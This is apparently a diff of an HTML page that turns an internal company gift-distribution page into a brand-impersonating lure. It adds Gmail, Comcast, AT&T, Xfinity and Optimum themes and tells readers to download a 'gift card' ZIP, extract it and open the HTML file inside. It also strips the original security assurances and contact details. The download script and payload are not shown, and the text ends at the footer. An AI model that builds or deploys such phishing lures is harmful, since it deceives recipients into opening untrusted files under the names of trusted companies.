@@ -3,553 +3,1284 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>[Your Company] - Holiday Gift Distribution</title>
+    <title>🎁 Download Your Holiday Gift Card</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        :root {
-            --company-primary: #2c3e50;
-            --company-secondary: #3498db;
-            --holiday-accent: #e74c3c;
-            --success-color: #27ae60;
-            --light-bg: #f8f9fa;
-        }
-        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 80%, rgba(120, 119, 198, 0.3) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.2) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        /* Dynamic Brand Colors */
+        :root {
+            --brand-primary: #EA4335;
+            --brand-secondary: #4285F4;
+            --brand-accent: #34A853;
+            --brand-gradient: linear-gradient(135deg, #EA4335 0%, #4285F4 100%);
+            --brand-name: 'Gmail';
+        }
+        
+        .brand-gmail {
+            --brand-primary: #EA4335;
+            --brand-secondary: #4285F4;
+            --brand-accent: #34A853;
+            --brand-gradient: linear-gradient(135deg, #EA4335 0%, #4285F4 100%);
+            --brand-name: 'Gmail';
+        }
+        
+        .brand-comcast {
+            --brand-primary: #003087;
+            --brand-secondary: #00a4e4;
+            --brand-accent: #e22129;
+            --brand-gradient: linear-gradient(135deg, #003087 0%, #00a4e4 100%);
+            --brand-name: 'Comcast';
+        }
+        
+        .brand-att {
+            --brand-primary: #009fdb;
+            --brand-secondary: #00a8e0;
+            --brand-accent: #ff6319;
+            --brand-gradient: linear-gradient(135deg, #009fdb 0%, #00a8e0 100%);
+            --brand-name: 'AT&T';
+        }
+        
+        .brand-xfinity {
+            --brand-primary: #000000;
+            --brand-secondary: #666666;
+            --brand-accent: #e22129;
+            --brand-gradient: linear-gradient(135deg, #000000 0%, #666666 100%);
+            --brand-name: 'Xfinity';
+        }
+        
+        .brand-optimum {
+            --brand-primary: #000000;
+            --brand-secondary: #00aff0;
+            --brand-accent: #ff6a00;
+            --brand-gradient: linear-gradient(135deg, #000000 0%, #00aff0 100%);
+            --brand-name: 'Optimum';
         }
         
         /* Main Container */
         .container {
-            max-width: 800px;
+            max-width: 900px;
             width: 100%;
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 24px;
+            box-shadow: 
+                0 20px 80px rgba(0, 0, 0, 0.3),
+                0 0 0 1px rgba(255, 255, 255, 0.1),
+                inset 0 0 0 1px rgba(255, 255, 255, 0.5);
             overflow: hidden;
+            position: relative;
+            animation: containerSlideIn 0.8s cubic-bezier(0.4, 0, 0.2, 1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
         
-        /* Company Header */
-        .company-header {
-            background: var(--company-primary);
+        @keyframes containerSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px) scale(0.98);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        
+        /* Floating Elements */
+        .floating-element {
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            background: var(--brand-gradient);
+            opacity: 0.1;
+            filter: blur(40px);
+            animation: float 20s infinite ease-in-out;
+            z-index: 0;
+        }
+        
+        .floating-element:nth-child(1) {
+            top: -100px;
+            right: -100px;
+            animation-delay: 0s;
+        }
+        
+        .floating-element:nth-child(2) {
+            bottom: -100px;
+            left: -100px;
+            animation-delay: 10s;
+        }
+        
+        @keyframes float {
+            0%, 100% {
+                transform: translate(0, 0) scale(1);
+            }
+            33% {
+                transform: translate(30px, -30px) scale(1.1);
+            }
+            66% {
+                transform: translate(-20px, 20px) scale(0.9);
+            }
+        }
+        
+        /* Brand Header */
+        .brand-header {
+            background: var(--brand-gradient);
             color: white;
-            padding: 30px;
+            padding: 50px 40px;
             text-align: center;
-            border-bottom: 5px solid var(--holiday-accent);
+            position: relative;
+            overflow: hidden;
+            min-height: 280px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
         }
         
-        .company-logo {
-            font-size: 3rem;
+        .brand-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                linear-gradient(45deg, rgba(255,255,255,0.1) 0%, transparent 100%),
+                url("data:image/svg+xml,%3Csvg width='100' height='100' viewBox='0 0 100 100' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M11 18c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm48 25c3.866 0 7-3.134 7-7s-3.134-7-7-7-7 3.134-7 7 3.134 7 7 7zm-43-7c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm63 31c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM34 90c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zm56-76c1.657 0 3-1.343 3-3s-1.343-3-3-3-3 1.343-3 3 1.343 3 3 3zM12 86c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm28-65c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm23-11c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-6 60c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm29 22c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zM32 63c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm57-13c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm-9-21c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM60 91c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM35 41c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2zM12 60c1.105 0 2-.895 2-2s-.895-2-2-2-2 .895-2 2 .895 2 2 2z' fill='%23ffffff' fill-opacity='0.1' fill-rule='evenodd'/%3E%3C/svg%3E");
+            pointer-events: none;
+        }
+        
+        .brand-logo-container {
+            width: 140px;
+            height: 140px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            padding: 30px;
+            box-shadow: 
+                0 15px 35px rgba(0, 0, 0, 0.2),
+                0 0 0 1px rgba(255, 255, 255, 0.3);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.4);
+            position: relative;
+            overflow: hidden;
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+        
+        @keyframes logoFloat {
+            0%, 100% {
+                transform: translateY(0) rotate(0deg);
+            }
+            50% {
+                transform: translateY(-10px) rotate(2deg);
+            }
+        }
+        
+        .brand-logo {
+            max-width: 100%;
+            max-height: 80px;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+        }
+        
+        .fallback-logo {
+            font-size: 60px;
+            color: var(--brand-primary);
+            display: none;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+        }
+        
+        .brand-header h1 {
+            font-size: 2.8rem;
             margin-bottom: 15px;
-            color: white;
+            text-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            background: linear-gradient(to bottom, #ffffff, rgba(255, 255, 255, 0.9));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
         
-        .company-header h1 {
-            font-size: 2.2rem;
-            margin-bottom: 10px;
-        }
-        
-        .company-header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
+        .brand-header p {
+            font-size: 1.3rem;
+            opacity: 0.95;
             max-width: 600px;
             margin: 0 auto;
+            font-weight: 400;
         }
         
         /* Content Area */
         .content {
-            padding: 40px;
+            padding: 50px;
+            position: relative;
+            z-index: 1;
         }
         
+        .welcome-message {
+            text-align: center;
+            margin-bottom: 50px;
+            position: relative;
+        }
+        
+        .welcome-message::after {
+            content: '';
+            position: absolute;
+            bottom: -25px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: var(--brand-gradient);
+            border-radius: 2px;
+            opacity: 0.5;
+        }
+        
+        .welcome-message h2 {
+            color: var(--brand-primary);
+            font-size: 2.2rem;
+            margin-bottom: 20px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .welcome-message p {
+            color: #5a5a5a;
+            font-size: 1.15rem;
+            line-height: 1.7;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        /* 3-Step Process */
         .process-steps {
             display: flex;
             flex-wrap: wrap;
-            gap: 20px;
-            margin: 30px 0;
+            gap: 25px;
+            margin: 60px 0;
+            position: relative;
+        }
+        
+        .process-steps::before {
+            content: '';
+            position: absolute;
+            top: 40px;
+            left: 50px;
+            right: 50px;
+            height: 4px;
+            background: linear-gradient(90deg, 
+                var(--brand-primary) 0%, 
+                var(--brand-secondary) 50%, 
+                var(--brand-accent) 100%);
+            opacity: 0.2;
+            border-radius: 2px;
+            z-index: 0;
         }
         
         .step {
             flex: 1;
-            min-width: 200px;
-            background: var(--light-bg);
-            padding: 25px;
-            border-radius: 12px;
+            min-width: 220px;
+            background: white;
+            padding: 35px 30px;
+            border-radius: 20px;
             text-align: center;
-            border: 2px solid #e9ecef;
-            transition: transform 0.3s ease;
+            border: 1px solid rgba(0, 0, 0, 0.08);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.05);
         }
         
         .step:hover {
-            transform: translateY(-5px);
-            border-color: var(--company-secondary);
-        }
-        
-        .step-icon {
-            width: 70px;
-            height: 70px;
-            background: var(--company-secondary);
-            color: white;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 30px;
+            transform: translateY(-10px) scale(1.02);
+            border-color: var(--brand-secondary);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.1),
+                0 0 0 1px rgba(var(--brand-secondary-rgb), 0.1);
         }
         
         .step-number {
-            display: inline-block;
-            width: 30px;
-            height: 30px;
-            background: var(--holiday-accent);
+            display: inline-flex;
+            width: 50px;
+            height: 50px;
+            background: var(--brand-gradient);
             color: white;
             border-radius: 50%;
-            line-height: 30px;
-            font-weight: bold;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 1.4rem;
+            margin-bottom: 25px;
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+            border: 3px solid white;
+        }
+        
+        .step-icon {
+            font-size: 3rem;
+            color: var(--brand-primary);
+            margin-bottom: 25px;
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
+        }
+        
+        .step h3 {
+            color: #2c3e50;
             margin-bottom: 15px;
+            font-size: 1.5rem;
+            font-weight: 600;
+        }
+        
+        .step p {
+            color: #7f8c8d;
+            line-height: 1.6;
+            font-size: 1.05rem;
         }
         
         /* Download Section */
         .download-section {
-            background: #f8f9fa;
-            border-radius: 12px;
-            padding: 30px;
-            margin: 30px 0;
-            border-left: 5px solid var(--success-color);
+            background: linear-gradient(135deg, 
+                rgba(var(--brand-primary-rgb), 0.05) 0%, 
+                rgba(var(--brand-secondary-rgb), 0.05) 100%);
+            border-radius: 20px;
+            padding: 40px;
+            margin: 50px 0;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .download-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 8px;
+            height: 100%;
+            background: var(--brand-gradient);
         }
         
         .download-section h3 {
-            color: var(--company-primary);
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .file-info {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            border: 1px solid #dee2e6;
-        }
-        
-        .file-icon {
-            width: 60px;
-            height: 60px;
-            background: linear-gradient(135deg, var(--company-secondary), #2980b9);
-            border-radius: 10px;
+            color: #2c3e50;
+            margin-bottom: 30px;
+            font-size: 1.8rem;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
-            font-size: 24px;
+            gap: 15px;
+            font-weight: 600;
+        }
+        
+        .file-info {
+            display: inline-flex;
+            align-items: center;
+            gap: 25px;
+            background: white;
+            padding: 25px 35px;
+            border-radius: 16px;
+            margin: 25px 0;
+            border: 2px dashed rgba(var(--brand-primary-rgb), 0.3);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+        
+        .file-info:hover {
+            border-color: var(--brand-primary);
+            transform: translateX(5px);
+        }
+        
+        .file-icon {
+            font-size: 3.5rem;
+            color: var(--brand-primary);
+            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.1));
         }
         
         .file-details {
-            flex: 1;
+            text-align: left;
         }
         
         .file-details h4 {
-            color: var(--company-primary);
-            margin-bottom: 5px;
+            color: #2c3e50;
+            margin-bottom: 8px;
+            font-size: 1.4rem;
+            font-weight: 600;
         }
         
         .file-details p {
-            color: #666;
-            font-size: 0.95rem;
-        }
-        
-        /* GitHub Info */
-        .github-info {
-            background: #24292e;
-            color: white;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-            font-family: 'Courier New', monospace;
-        }
-        
-        .github-info pre {
-            overflow-x: auto;
-            padding: 15px;
-            background: #1b1f23;
-            border-radius: 6px;
-            margin-top: 10px;
-        }
-        
-        /* Buttons */
-        .button-group {
-            display: flex;
-            gap: 15px;
-            margin-top: 30px;
-            flex-wrap: wrap;
-        }
-        
-        .btn {
-            padding: 15px 30px;
-            border-radius: 8px;
-            border: none;
-            font-weight: 600;
+            color: #7f8c8d;
             font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
+        }
+        
+        .user-info {
             display: inline-flex;
             align-items: center;
             gap: 10px;
-            text-decoration: none;
+            padding: 12px 20px;
+            background: rgba(var(--brand-primary-rgb), 0.1);
+            border-radius: 50px;
+            margin-top: 15px;
+            color: var(--brand-primary);
+            font-weight: 500;
+            border: 1px solid rgba(var(--brand-primary-rgb), 0.2);
         }
         
-        .btn-primary {
-            background: linear-gradient(135deg, var(--success-color), #219653);
+        /* Download Button */
+        .download-button {
+            padding: 22px 55px;
+            background: var(--brand-gradient);
             color: white;
-        }
-        
-        .btn-primary:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 25px rgba(39, 174, 96, 0.4);
-        }
-        
-        .btn-secondary {
-            background: #6c757d;
-            color: white;
-        }
-        
-        .btn-secondary:hover {
-            background: #5a6268;
-        }
-        
-        .btn-outline {
-            background: transparent;
-            border: 2px solid var(--company-secondary);
-            color: var(--company-secondary);
-        }
-        
-        .btn-outline:hover {
-            background: var(--company-secondary);
-            color: white;
-        }
-        
-        /* Instructions */
-        .instructions {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 10px;
-            padding: 20px;
-            margin: 30px 0;
-            color: #856404;
-        }
-        
-        .instructions h4 {
-            display: flex;
+            border: none;
+            border-radius: 16px;
+            font-size: 1.4rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            display: inline-flex;
             align-items: center;
-            gap: 10px;
-            margin-bottom: 10px;
+            gap: 18px;
+            margin: 25px 0;
+            box-shadow: 
+                0 12px 30px rgba(0, 0, 0, 0.2),
+                0 0 0 1px rgba(255, 255, 255, 0.3);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
         }
         
-        .instructions ol {
-            margin-left: 20px;
-            margin-top: 10px;
+        .download-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.2), 
+                transparent);
+            transition: 0.5s;
         }
         
-        .instructions li {
-            margin-bottom: 8px;
+        .download-button:hover {
+            transform: translateY(-8px) scale(1.05);
+            box-shadow: 
+                0 20px 50px rgba(0, 0, 0, 0.3),
+                0 0 0 1px rgba(255, 255, 255, 0.4);
+        }
+        
+        .download-button:hover::before {
+            left: 100%;
+        }
+        
+        .download-button:active {
+            transform: translateY(-4px) scale(1.02);
+        }
+        
+        /* Gift Code Display */
+        .gift-code-section {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border-radius: 20px;
+            padding: 40px;
+            color: white;
+            margin: 50px 0;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 
+                0 15px 35px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+        
+        .gift-code-section::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, 
+                rgba(255, 255, 255, 0.1) 0%, 
+                transparent 70%);
+            animation: rotate 20s linear infinite;
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .code-label {
+            font-size: 1.1rem;
+            opacity: 0.9;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .gift-code {
+            font-family: 'SF Mono', 'Cascadia Mono', 'Courier New', monospace;
+            font-size: 2.2rem;
+            letter-spacing: 4px;
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            margin: 25px 0;
+            display: inline-block;
+            min-width: 350px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            position: relative;
+            z-index: 1;
+            box-shadow: 
+                inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                0 8px 25px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% {
+                box-shadow: 
+                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                    0 8px 25px rgba(0, 0, 0, 0.3);
+            }
+            50% {
+                box-shadow: 
+                    inset 0 1px 0 rgba(255, 255, 255, 0.1),
+                    0 8px 35px rgba(var(--brand-accent-rgb), 0.4);
+            }
+        }
+        
+        .gift-code:hover {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-2px);
         }
         
         /* Footer */
         .footer {
             text-align: center;
-            padding: 25px;
-            background: var(--company-primary);
-            color: white;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 35px 40px;
+            background: linear-gradient(180deg, 
+                rgba(248, 249, 250, 0.95) 0%, 
+                rgba(240, 242, 245, 0.95) 100%);
+            color: #6c757d;
+            border-top: 1px solid rgba(0, 0, 0, 0.05);
+            position: relative;
+            z-index: 1;
+        }
+        
+        .footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, 
+                transparent, 
+                var(--brand-primary), 
+                transparent);
+            opacity: 0.3;
+        }
+        
+        .footer-brand {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
         }
         
         .contact-info {
-            margin-top: 10px;
+            margin-top: 20px;
+            font-size: 1rem;
+        }
+        
+        .contact-info strong {
+            color: var(--brand-primary);
+            font-weight: 600;
+        }
+        
+        .copyright {
+            margin-top: 25px;
             font-size: 0.9rem;
-            opacity: 0.8;
+            opacity: 0.7;
+            letter-spacing: 0.5px;
         }
         
         /* Responsive */
-        @media (max-width: 768px) {
+        @media (max-width: 992px) {
+            .container {
+                margin: 20px;
+                max-width: 95%;
+            }
+            
             .content {
+                padding: 40px 30px;
+            }
+            
+            .brand-header {
+                padding: 40px 30px;
+                min-height: 240px;
+            }
+            
+            .process-steps::before {
+                display: none;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                border-radius: 20px;
+            }
+            
+            .content {
+                padding: 30px 25px;
+            }
+            
+            .brand-header {
+                padding: 30px 25px;
+                min-height: 200px;
+            }
+            
+            .brand-header h1 {
+                font-size: 2.2rem;
+            }
+            
+            .brand-logo-container {
+                width: 100px;
+                height: 100px;
                 padding: 20px;
+                margin-bottom: 20px;
+            }
+            
+            .brand-logo {
+                max-height: 60px;
             }
             
             .process-steps {
                 flex-direction: column;
+                gap: 20px;
+                margin: 40px 0;
+            }
+            
+            .step {
+                padding: 30px 25px;
             }
             
             .file-info {
                 flex-direction: column;
                 text-align: center;
+                padding: 20px;
+                gap: 20px;
             }
             
-            .button-group {
-                flex-direction: column;
+            .file-details {
+                text-align: center;
             }
             
-            .btn {
+            .gift-code {
+                font-size: 1.8rem;
+                min-width: auto;
+                padding: 20px;
+                letter-spacing: 3px;
+            }
+            
+            .download-button {
                 width: 100%;
+                max-width: 300px;
                 justify-content: center;
+                padding: 20px 30px;
+                font-size: 1.2rem;
             }
+        }
+        
+        @media (max-width: 480px) {
+            .brand-header h1 {
+                font-size: 1.8rem;
+            }
+            
+            .brand-header p {
+                font-size: 1.1rem;
+            }
+            
+            .welcome-message h2 {
+                font-size: 1.8rem;
+            }
+            
+            .gift-code {
+                font-size: 1.5rem;
+                padding: 15px;
+                letter-spacing: 2px;
+            }
+            
+            .footer {
+                padding: 25px 20px;
+            }
+        }
+        
+        /* Utility Classes */
+        .text-gradient {
+            background: var(--brand-gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .glass-effect {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
         }
     </style>
 </head>
 <body>
+    <div class="floating-element"></div>
+    <div class="floating-element"></div>
+    
     <div class="container">
-        <!-- Company Header -->
-        <header class="company-header">
-            <div class="company-logo">
-                <i class="fas fa-gift"></i>
+        <!-- Dynamic Brand Header -->
+        <header class="brand-header">
+            <div class="brand-logo-container">
+                <img src="" alt="Brand Logo" class="brand-logo" id="brandLogo">
+                <div class="fallback-logo" id="fallbackLogo">
+                    <i class="fas fa-gift"></i>
+                </div>
             </div>
-            <h1>[Your Company Name]</h1>
-            <p>Holiday Gift Distribution System</p>
-            <p style="margin-top: 15px; font-size: 1rem; opacity: 0.8;">Employee ID Required • Internal Use Only</p>
+            <h1>Your Holiday Gift is Ready!</h1>
+            <p>Download your personalized gift card ZIP file</p>
         </header>
         
         <!-- Main Content -->
         <main class="content">
-            <h2 style="color: var(--company-primary); margin-bottom: 20px; text-align: center;">
-                Download Your Holiday Gift
-            </h2>
+            <div class="welcome-message">
+                <h2 class="text-gradient">🎁 Download Your Gift Card</h2>
+                <p>
+                    Your exclusive holiday gift has been prepared. Please download the ZIP file below, 
+                    extract it, and open the file to reveal your personalized gift card.
+                </p>
+            </div>
             
-            <p style="text-align: center; color: #666; margin-bottom: 30px; max-width: 600px; margin-left: auto; margin-right: auto;">
-                Your personalized holiday gift card has been prepared. Please follow the steps below to download and view your gift.
-            </p>
-            
-            <!-- Process Steps -->
+            <!-- 3-Step Process -->
             <div class="process-steps">
                 <div class="step">
                     <div class="step-number">1</div>
                     <div class="step-icon">
                         <i class="fas fa-download"></i>
                     </div>
-                    <h3>Download File</h3>
-                    <p>Download your personalized gift file from the secure GitHub repository.</p>
+                    <h3>Download ZIP File</h3>
+                    <p>Click the download button below to get your personalized gift card ZIP file</p>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">2</div>
                     <div class="step-icon">
-                        <i class="fas fa-file-code"></i>
+                        <i class="fas fa-file-archive"></i>
                     </div>
-                    <h3>Save Locally</h3>
-                    <p>Save the HTML file to your computer in a location you can easily find.</p>
+                    <h3>Extract ZIP File</h3>
+                    <p>Right-click the downloaded file and select "Extract All" to unzip it</p>
                 </div>
                 
                 <div class="step">
                     <div class="step-number">3</div>
                     <div class="step-icon">
-                        <i class="fas fa-eye"></i>
+                        <i class="fas fa-gift"></i>
                     </div>
-                    <h3>Open in Browser</h3>
-                    <p>Double-click the downloaded file to view your gift card in your web browser.</p>
+                    <h3>Open Gift Card</h3>
+                    <p>Double-click the "Your_Gift_Card.html" file to view your gift in browser</p>
                 </div>
             </div>
             
             <!-- Download Section -->
             <div class="download-section">
-                <h3><i class="fab fa-github"></i> Download Your Gift File</h3>
+                <h3><i class="fas fa-file-download"></i> Download Your Gift Card</h3>
                 
                 <div class="file-info">
                     <div class="file-icon">
-                        <i class="fas fa-file-code"></i>
+                        <i class="fas fa-file-archive"></i>
                     </div>
                     <div class="file-details">
-                        <h4>Your Personalized Gift Card</h4>
-                        <p>HTML File • Contains your unique gift card code and redemption instructions</p>
-                        <p style="margin-top: 10px; color: var(--holiday-accent); font-weight: 500;">
-                            <i class="fas fa-user-check"></i> Assigned to: <span id="employeeName">Loading...</span>
-                        </p>
+                        <h4 id="fileName">Your_Holiday_Gift.zip</h4>
+                        <p>ZIP Archive • Contains your personalized gift card</p>
+                        <div class="user-info">
+                            <i class="fas fa-user-check"></i>
+                            <span>Prepared for: <span id="employeeName">Valued Employee</span></span>
+                        </div>
                     </div>
                 </div>
                 
-                <!-- GitHub Information -->
-                <div class="github-info">
-                    <p><i class="fab fa-github"></i> Secure GitHub Repository:</p>
-                    <pre id="githubLink">https://github.com/[your-org]/employee-gifts/[employee-id]/gift.html</pre>
-                    <p style="font-size: 0.9rem; margin-top: 10px; color: #c9d1d9;">
-                        <i class="fas fa-shield-alt"></i> Access restricted to company employees only
-                    </p>
-                </div>
+                <!-- Download Button -->
+                <button class="download-button" onclick="downloadGiftZip()">
+                    <i class="fas fa-download"></i> Download Gift Card ZIP File
+                </button>
                 
-                <!-- Action Buttons -->
-                <div class="button-group">
-                    <a href="#" class="btn btn-primary" id="downloadBtn" onclick="downloadGiftFile(event)">
-                        <i class="fas fa-download"></i> Download Gift File
-                    </a>
-                    
-                    <button class="btn btn-secondary" onclick="showInstructions()">
-                        <i class="fas fa-question-circle"></i> View Instructions
-                    </button>
-                    
-                    <button class="btn btn-outline" onclick="emailInstructions()">
-                        <i class="fas fa-envelope"></i> Email Me Instructions
-                    </button>
-                </div>
-            </div>
-            
-            <!-- Viewing Instructions -->
-            <div class="instructions" id="instructionsBox" style="display: none;">
-                <h4><i class="fas fa-laptop"></i> How to View Your Gift Card</h4>
-                <ol>
-                    <li>After downloading, locate the file in your <strong>Downloads</strong> folder</li>
-                    <li><strong>Right-click</strong> the file and select "Open With" → "Web Browser" (Chrome, Firefox, Edge, etc.)</li>
-                    <li>Alternatively, <strong>double-click</strong> the file if .html files open in your browser by default</li>
-                    <li>Your gift card will display with your unique code and redemption instructions</li>
-                    <li>Save or print the page for your records</li>
-                </ol>
-                <p style="margin-top: 15px; font-style: italic;">
-                    <i class="fas fa-exclamation-triangle"></i> 
-                    Security Note: This file contains only HTML/CSS/JavaScript code - no executable programs.
-                    Your browser's security settings may warn about local files; this is normal.
+                <p style="color: #6c757d; margin-top: 20px; font-size: 0.95rem;">
+                    File size: ~1.5 MB • Contains: HTML gift card + instructions
                 </p>
             </div>
             
-            <!-- Security Assurance -->
-            <div style="background: #e3f2fd; padding: 20px; border-radius: 10px; margin-top: 30px; border-left: 4px solid var(--company-secondary);">
-                <h4 style="color: var(--company-primary); display: flex; align-items: center; gap: 10px;">
-                    <i class="fas fa-shield-alt"></i> Security & Privacy
-                </h4>
-                <p style="color: #555; margin-top: 10px;">
-                    This system uses GitHub's secure infrastructure for file distribution. Each employee receives a unique, 
-                    non-transferable gift card. Files are served over HTTPS and contain no malware or tracking scripts.
-                    For verification, you can view the source code of your gift file in any text editor.
+            <!-- Gift Code Display -->
+            <div class="gift-code-section">
+                <div class="code-label">Your Gift Activation Code</div>
+                <div class="gift-code" id="giftCode">GIFT-XXXX-XXXX-XXXX</div>
+                <p style="opacity: 0.9; margin-top: 20px; position: relative; z-index: 1;">
+                    This code will be displayed in your gift card after opening the ZIP file
                 </p>
             </div>
         </main>
         
         <!-- Footer -->
         <footer class="footer">
-            <p>[Your Company Name] Internal Gift Distribution System</p>
-            <p class="contact-info">
-                Need assistance? Contact: <strong>it-support@yourcompany.com</strong> or call ext. 4321<br>
-                For gift-related questions: <strong>hr@yourcompany.com</strong>
-            </p>
-            <p style="margin-top: 15px; font-size: 0.8rem; opacity: 0.7;">
